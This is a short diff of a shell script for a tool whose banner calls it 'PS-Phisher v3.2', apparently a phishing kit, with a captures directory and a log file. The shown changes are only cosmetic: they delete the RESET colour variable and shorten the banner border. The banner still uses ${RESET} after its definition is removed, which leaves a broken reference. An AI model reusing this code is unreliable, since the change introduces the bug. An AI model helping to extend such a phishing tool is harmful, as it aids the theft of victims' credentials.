@@ -16,7 +16,6 @@ CAPTURE_DIR=".server/captures"
 LOG_FILE="$SERVER_DIR/ps-phisher.log"
 
 # Cores neon / matrix
-RESET="\033[0m"
 BOLD="\033[1m"
 RED="\033[91m"
 GREEN="\033[92m"
@@ -32,12 +31,12 @@ MATRIX_COLOR="\033[38;2;0;255;0m"
 banner() {
     clear
     echo -e "${MATRIX_COLOR}"
-    echo "  [+] ========================================= [+]"
+    echo "  [+] ======================================== [+]"
     echo "  [+}                                          {+]"
     echo "  [+]           PS-Phisher v3.2                [+]"
     echo "  [+]         PeekSecurity Team                [+]"
     echo "  [+}                                          {+]"
-    echo "  [+] ========================================= [+]${RESET}"
+    echo "  [+] ======================================== [+]${RESET}"
     echo
 }
 
